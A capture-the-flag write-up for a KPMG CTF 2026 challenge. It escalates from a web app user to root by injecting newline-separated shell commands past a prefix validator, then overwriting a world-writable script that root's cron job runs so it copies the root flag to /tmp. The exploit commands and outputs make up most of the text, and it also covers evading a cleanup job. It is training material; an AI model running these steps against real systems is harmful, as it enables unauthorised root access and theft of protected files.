# KPMG CTF 2026: Healthy Hijack - 2 — Privilege Escalation Writeup

## Challenge Information

| Field | Details |
| :--- | :--- |
| **Challenge Name** | Healthy Hijack - 2 |
| **Category** | Command Injection / Cron Job Hijacking |
| **Target Host** | `0.cloud.chals.io` (Separate challenge instance) |
| **Objective** | Escalate from `appuser` to root and recover the root flag |
| **Root Flag** | `KPMG_CTF{q03a4OxG9_935IaRdz6pbmvezyD4IMZalQtwfdkNyJo}` |

---

## 1. Important Instance Note

This challenge runs on a separate target instance from Healthy Hijack - 1 with dynamic, per-instance flags. The root flag must be retrieved independently through active cron exploitation.

---

## 2. Command Injection & Output Capture Primitive

The web application runs a command validator that requires the command string to start with `ping`, `traceroute`, or `nslookup`. Because newlines are unescaped and passed directly to `/bin/sh`, secondary commands can be executed.

To ensure both standard output and standard error are returned reliably, command injection was framed using subshells redirecting to temporary files:

```text
nslookup __ >/dev/null 2>/dev/null
( id ) >/tmp/_o 2>/tmp/_e
cat /tmp/_o
cat /tmp/_e
```

**Output:**
```text
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

---

## 3. Enumerating the Root Cron Job

Inspecting permissions on `/opt/healthcheck.sh`:

```text
nslookup __ >/dev/null 2>/dev/null
( ls -l /opt/healthcheck.sh ) >/tmp/_o 2>/tmp/_e
cat /tmp/_o
```

**Output:**
```text
-rwxrwxrwx 1 root root 64 ... /opt/healthcheck.sh
```

Inspecting `/etc/crontab`:

```text
nslookup __ >/dev/null 2>/dev/null
( cat /etc/crontab ) >/tmp/_o 2>/tmp/_e
cat /tmp/_o
```

The crontab indicates that `root` executes `/opt/healthcheck.sh` every minute at second zero, with short sleep offsets:
```text
* * * * * root /opt/healthcheck.sh
* * * * * root sleep 10; /opt/healthcheck.sh
* * * * * root sleep 20; /opt/healthcheck.sh
* * * * * root sleep 30; /opt/healthcheck.sh
* * * * * root sleep 40; /opt/healthcheck.sh
* * * * * root sleep 50; /opt/healthcheck.sh
```

A periodic cleanup job runs every few minutes to remove SUID binaries from `/tmp`, but it leaves standard mode-0644 text files intact. Therefore, copying `/root/root.txt` to `/tmp/rootflag.txt` with standard read permissions is an effective, non-destructive exfiltration method.

---

## 4. Hijacking the Script & Capturing the Flag

Injecting commands to overwrite `/opt/healthcheck.sh`:

```text
nslookup __ >/dev/null 2>/dev/null
echo '#!/bin/sh' > /opt/healthcheck.sh
echo 'cp /root/root.txt /tmp/rootflag.txt' >> /opt/healthcheck.sh
echo 'chmod 644 /tmp/rootflag.txt' >> /opt/healthcheck.sh
```

Waiting 10 seconds for the next root cron trigger to fire, then reading the copied flag file:

```text
nslookup __ >/dev/null 2>/dev/null
cat /tmp/rootflag.txt
```

**Root Flag Output:**
```text
KPMG_CTF{q03a4OxG9_935IaRdz6pbmvezyD4IMZalQtwfdkNyJo}
```

---

## 5. Final Flag

```text
KPMG_CTF{q03a4OxG9_935IaRdz6pbmvezyD4IMZalQtwfdkNyJo}
```

---

## 6. Key Takeaways
- **Cron Job Script Hijacking:** Any root-executed cron job that references a script with write permissions for lower-privileged users is a trivial root privilege escalation.
- **Defeating Temporary Cleanup Scripts:** When cleanup tasks search for SUID binaries or root shells in `/tmp`, simply copying protected text files and making them world-readable (`chmod 644`) bypasses cleanup logic without leaving suspicious executables.
